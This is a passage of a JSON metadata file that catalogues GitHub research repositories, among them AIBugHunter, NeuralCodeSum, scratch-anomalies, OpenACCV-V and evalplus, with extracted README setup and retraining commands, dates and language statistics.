train_bert_base.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH15* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH17* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/naive_bayes\npython naive_bayes_main.py\n```\nRun the following command to download the pre-trained model:\nBASH19* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bert\nsh train_codebert.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH21* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bert\nsh train_bert_base.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH23* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH25* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bow_lr\npython lr_main.py\n```\nRun the following command to download the pre-trained model:\nBASH27* \n## License \n<a href=\"https://github.com/awsm-research/AIBugHunter/blob/main/LICENSE\">MIT License</a> \n",
                    "original_header": "About the Experiment Replication"
                },
                "confidence": 0.9969689125836756,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/AIBugHunter/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div align=\"center\">\n  \n# <a href=\"https://aibughunter.github.io/\">AIBugHunter</a> Replication Package \n  \n### About the Environment Setup\n<details open=\"open\">\n  <summary></summary>\n  \nFirst of all, clone this repository to your local machine and access the main dir via the following command:\n```\ngit clone https://github.com/awsm-research/AIBugHunter.git\ncd AIBugHunter\n``` \n",
                    "original_header": "Expected Results"
                },
                "confidence": 0.9994282201408462,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/AIBugHunter/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Then, install the python dependencies via the following command:\n```\npip install numpy\npip install torch\npip install transformers\npip install tqdm\npip install pandas\npip install scikit-learn\npip install argparse\npip install gdown\n``` \nAlternatively, we provide requirements.txt with version of packages specified to ensure the reproducibility,\nyou may install via the following commands:\n```\npip install -r requirements.txt\n``` \nIf having an issue with the gdown package, try the following commands:\n```\ngit clone https://github.com/wkentaro/gdown.git\ncd gdown\npip install .\ncd ..\n``` \n",
                    "original_header": "About the Environment Setup"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/AIBugHunter/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* We highly recommend you check out this <a href=\"https://pytorch.org/\">installation guide</a> for the \"torch\" library so you can install the appropriate version on your device.\n  \n* To utilize GPU (optional), you also need to install the CUDA library, you may want to check out this <a href=\"https://docs.nvidia.com/cuda/cuda-quick-start-guide/index.html\">installation guide</a>.\n  \n* <a href=\"https://www.python.org/downloads/release/python-397/\">Python 3.9.7</a> is recommended, which has been fully tested without issues.\n \n</details>\n  \n### About the Datasets\n<details open=\"open\">\n  <summary></summary>\nWe use the Big-Vul dataset provided by Fan et al., for more information about the dataset, please refer to <a href=\"https://github.com/ZeoVan/MSR_20_Code_vulnerability_CSV_Dataset\">this repository</a>. \n</div>\n</details> \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/mo_bert\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH7* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/codebert_base\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH9* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/bert_base\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH11* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH13* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/naive_bayes\npython naive_bayes_main.py\n```\nRun the following command to download the pre-trained model:\nBASH15* \nRun the following command to retrain:\n```\ncd rq1_cwe_id_cls/mo_bert\nsh train.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH7*\nNote. Since our approach is a multi-task learning approach, the model is the same as the one used in RQ1. \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bert_baseline\nsh train_codebert.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH17* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bert_baseline\nsh train_bert_base.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH19* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH21* \nRun the following command to retrain:\n```\ncd rq2_cwe_type_cls/naive_bayes\npython naive_bayes_main.py\n```\nRun the following command to download the pre-trained model:\nBASH23* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bert\nsh train_codebert.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH25* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bert\nsh train_bert_base.sh\n```\nRun the following command to run inference using the pre-trained model:\nBASH27* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bow_rf\npython rf_main.py\n```\nRun the following command to download the pre-trained model:\nBASH29* \nRun the following command to retrain:\n```\ncd rq3_cvss_score_reg/bow_lr\npython lr_main.py\n```\nRun the following command to download the pre-trained model:\nBASH31* \n",
                    "original_header": "Expected Results"
                },
                "confidence": 0.9986664921655287,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/AIBugHunter/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-11-08T10:59:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T02:46:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 164916
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8273
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "85": {
        "filename": "wasiahmad_NeuralCodeSum_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wasiahmad/NeuralCodeSum",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You may consider installing the C2NL package. C2NL requires Linux and Python 3.6 or higher. It also requires installing PyTorch version 1.3. Its other dependencies are listed in requirements.txt. CUDA is strongly recommended for speed, but not necessary.\n\nRun the following commands to clone the repository and install C2NL:\n\n```\ngit clone https://github.com/wasiahmad/NeuralCodeSum.git\ncd NeuralCodeSum; pip install -r requirements.txt; python setup.py develop\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing C2NL",
                    "parent_header": [
                        "A Transformer-based Approach for Source Code Summarization"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/wasiahmad/NeuralCodeSum/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-22T19:29:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T16:41:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 310009
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12857
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "86": {
        "filename": "se2p_scratch-anomalies_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/scratch-anomalies",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "LitterBox creates script models which are the input for JADET for both violation and pattern mining.\nUse the [LitterBox jar](https://github.com/se2p/scratch-anomalies/blob/master/litterbox/Litterbox-1.4-SNAPSHOT.jar) to generate script models:\n```\njava -jar Litterbox-1.4-SNAPSHOT.jar --models --path <path to projects directory> --output <path to models directory>\n```\nNote that LitterBox deletes all files in the output directory before every run to keep models of different runs separated.\n \n",
                    "original_header": "Script Model Generation"
                },
                "confidence": 0.9868489290795284,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/scratch-anomalies/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Linux and Mac: For all JADET-related steps use this [bash script](https://github.com/se2p/scratch-anomalies/blob/master/jadet/jadet). \n",
                    "original_header": "Violations and Patterns"
                },
                "confidence": 0.983911512923289,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/scratch-anomalies/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To mine violations on Linux and Mac use \n```\n./jadet -output-violations-xml -models-dir <path to models directory> 20 2 10000 0.9 <path to xml file>\n``` \n",
                    "original_header": "Violation Mining"
                },
                "confidence": 0.9977496248983234,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/scratch-anomalies/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "JADET has a GUI we adapted to work with Scratch scripts.  \nTo view the graphical representations of the violations you need to have [graphviz](https://graphviz.org/) installed.  \nGUI Usage on Linux and Mac:\n```\n ./jadet -edit-violations-xml <path to xml file>\n``` \n",
                    "original_header": "Graphical User Interface"
                },
                "confidence": 0.9995022141893484,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/scratch-anomalies/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To generate dotfile output for these patterns on Linux and Mac use\n```\n./jadet -visualize-all <path to directory for dotfiles> <path to patterns file> \n``` \n",
                    "original_header": "Pattern Mining"
                },
                "confidence": 0.9840295726528521,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/scratch-anomalies/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-17T16:58:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-10-27T15:06:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3082982
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 17939
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "87": {
        "filename": "OpenACCUserGroup_OpenACCV-V_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpenACCUserGroup/OpenACCV-V",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "_In order to run the suite, we have provided a Python script, infrastructure.py that can be run. It is recommended to use Python 3.3 or later._\n\n1. Clone the repo\n   ```sh\n   git clone https://github.com/OpenACCUserGroup/OpenACCV-V.git\n   ```\n3. Change the `init_config.txt` file to match your configuration\n\n4. Run the script\n   ```sh\n   python3 infrastructure.py -c=<config_input_file> -o=<output_file>\n   ```\n   or\n   ```sh\n   python3 infrastructure.py -c=<configuration_file[,configuration_file2]> -o=<output_file> -in=<input_file[,input_file2]>  verbose -system=<system_name> -env=<environment_output>\n    ```\n\n\n<p align=\"right\">(<a href=\"#readme-top\">back to top</a>)</p>\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/OpenACCUserGroup/OpenACCV-V/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- [x] Add Initial Tests\n- [x] Add Infrastructure\n- [ ] Develop Example Guide\n- [ ] Add More Case Features\n- [ ] OpenACC Specification Version\n    - [ ] 3.3\n    - [ ] 3.2\n    - [ ] 3.1\n    - [ ] 3.0\n    - [X] 2.7\n    - [X] 2.5\n    - [X] 2.0\n    - [X] 1.0 \n",
                    "original_header": "Roadmap"
                },
                "confidence": 0.9823561404455771,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenACCUserGroup/OpenACCV-V/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n[contributors-shield]: https://img.shields.io/github/contributors/OpenACCUserGroup/OpenACCV-V?style=for-the-badge\n[contributors-url]: https://github.com/OpenACCUserGroup/OpenACCV-V/graphs/contributors\n[forks-shield]: https://img.shields.io/github/forks/OpenACCUserGroup/OpenACCV-V.svg?style=for-the-badge\n[forks-url]: https://github.com/OpenACCUserGroup/OpenACCV-V/network/members\n[stars-shield]: https://img.shields.io/github/stars/OpenACCUserGroup/OpenACCV-V.svg?style=for-the-badge\n[stars-url]: https://github.com/OpenACCUserGroup/OpenACCV-V/stargazers\n[issues-shield]: https://img.shields.io/github/issues/OpenACCUserGroup/OpenACCV-V.svg?style=for-the-badge\n[issues-url]: https://github.com/OpenACCUserGroup/OpenACCV-V/issues\n[license-shield]: https://img.shields.io/github/license/OpenACCUserGroup/OpenACCV-V.svg?style=for-the-badge\n[license-url]: https://github.com/OpenACCUserGroup/OpenACCV-V/blob/master/LICENSE\n \n",
                    "original_header": "Publications"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenACCUserGroup/OpenACCV-V/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-12T01:43:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-16T20:47:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Fortran",
                    "name": "Fortran",
                    "type": "Programming_language",
                    "size": 1133212
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1100984
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1018246
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 117380
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 30850
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 7436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 7256
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "88": {
        "filename": "castor-software_autographql_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/autographql",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-28T08:49:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-10T14:28:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 5220403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5146346
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PHP",
                    "name": "PHP",
                    "type": "Programming_language",
                    "size": 4612582
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1513829
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 236386
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 67574
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 53695
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2090
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Handlebars",
                    "name": "Handlebars",
                    "type": "Programming_language",
                    "size": 992
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 439
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Procfile",
                    "name": "Procfile",
                    "type": "Programming_language",
                    "size": 226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "89": {
        "filename": "evalplus_evalplus_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evalplus/evalplus",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n    <a href=\"https://evalplus.github.io/leaderboard.html\"><img src=\"https://img.shields.io/badge/%F0%9F%8F%86-leaderboard-8A2BE2\"></a>\n    <a href=\"https://openreview.net/forum?id=1qvx610Cu7\"><img src=\"https://img.shields.io/badge/Paper-NeurIPS'23-a55fed.svg\"></a>\n    <a href=\"https://huggingface.co/evalplus/\"><img src=\"https://img.shields.io/badge/\ud83e\udd17%20Hugging%20Face-evalplus-%23ff8811.svg\"></a>\n    <a href=\"https://pypi.org/project/evalplus/\"><img src=\"https://img.shields.io/pypi/v/evalplus?color=g\"></a>\n    <a href=\"https://pepy.tech/project/evalplus\"><img src=\"https://static.pepy.tech/badge/evalplus\"></a>\n    <a href=\"https://hub.docker.com/r/ganler/evalplus\" title=\"Docker\"><img src=\"https://img.shields.io/docker/image-size/ganler/evalplus\"></a>\n    <a href=\"https://github.com/evalplus/evalplus/blob/master/LICENSE\"><img src=\"https://img.shields.io/pypi/l/evalplus\"></a>\n</p> \n",
                    "original_header": "`EvalPlus(\ud83d\udcd6) =&gt; \ud83d\udcda`"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evalplus/evalplus/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> [!Important]\n>\n> \ud83d\udea7 **MBPP+ update (`v0.1.0` to `v0.2.0`)**:\n> We recently improved and stablized MBPP+ dataset by removing some tasks whose `test_list` is wrong (brought by the original MBPP dataset itself) to make it more reasonable to solve.\n> In `v0.1.0` MBPP+ has 399 tasks while the new `v0.2.0` has 378 tasks.\n> We also improved the oracle. Therefore, **using `v0.2.0` you might expect ~4pp pass@1 improvement** for both base and plus tests.\n \n",
                    "original_header": "About"
                },
                "confidence": 0.9697460671468692,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evalplus/evalplus/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-15T04:20:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T14:23:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 319882
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 593
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 465
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "90": {
        "filename": "ualberta-smr_conflict-prediction_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ualberta-smr/conflict-prediction",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-06-11T21:15:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-09-17T18:13:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 111270
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TSQL",
                    "name": "TSQL",
                    "type": "Programming_language",
                    "size": 11468
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 553
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "91": {
        "filename": "garghub_Cerebro_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/garghub/Cerebro",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Tools/dependencies that we require before executing the code: \n1. Apache Maven ( available here: https://maven.apache.org/download.cgi )\n2. srcML ( available here: https://www.srcml.org/ ) \nNOTE: please do not forget to modify below variables in data.java file to specify your desired repository locations and/or dependencies \nstatic String dirDataset = \"D:/ag/github/Cerebro/dataset\"; \nmvn clean package \nthe trained models are available as below: \nTools/dependencies that we require to train/test the models: \n1. seq2seq ( available here: https://google.github.io/seq2seq/getting_started/#download-setup )\n2. Tkinter (available here: https://docs.python.org/3.8/library/tkinter.html )\n3. TensorFlow ( available here: https://www.tensorflow.org/install/pip )\n4. PyYAML ( available here: https://pyyaml.org/wiki/LibYAML )\n5. Perl (available here: https://www.cpan.org/modules/INSTALL.html ) \nplease refer to the script train.sh available at Cerebro/dataset/subsuming-mutant-prediction-java/smp/seq2seq/train.sh \nplease refer to the script test.sh available at Cerebro/dataset/subsuming-mutant-prediction-java/smp/seq2seq/test.sh \n./test.sh ../smp-java-50-01/test ../smp-java-50-01/model genrhs-smp-java-50-01.txt \n",
                    "original_header": "*Cerebro: Static Subsuming Mutant Selection*"
                },
                "confidence": 0.9717127564732408,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/garghub/Cerebro/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-10-02T17:57:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-08T08:27:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "92": {
        "filename": "FeldiPat_ASE22-Neatest-Artifact_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FeldiPat/ASE22-Neatest-Artifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-08-10T07:30:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-10T08:15:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 13701360
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 1384002
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 55260
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 36997
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 22468
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 21924
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "93": {
        "filename": "soumickmj_pytorch-complex_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soumickmj/pytorch-complex",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Install it using pip:  \npip install pytorch-complex \n",
                    "original_header": "pytorch-complex"
                },
                "confidence": 0.9999631862322336,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soumickmj/pytorch-complex/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-06T10:33:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-07T21:10:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 202993
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "94": {
        "filename": "PLaSSticity_Raptor_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PLaSSticity/Raptor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "See INSTALL.txt for instructions for installing and using RoadRunner.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation and Running"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/PLaSSticity/Raptor/master/README.txt"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    \t    \t See CHANGES.txt for more details.\n \n",
                    "original_header": "Notes on Major Updates"
                },
                "confidence": 0.9636671480066423,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PLaSSticity/Raptor/master/README.txt"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Redistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet: \n"
                },
                "confidence": 0.9843590527694953,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PLaSSticity/Raptor/master/README.txt"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-07-18T23:10:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-03-10T02:06:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3516948
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 23338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3892
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Lex",
                    "name": "Lex",
                    "type": "Programming_language",
                    "size": 2504
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 2375
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "95": {
        "filename": "disa-lab_automl-challenge-so_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/disa-lab/automl-challenge-so",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
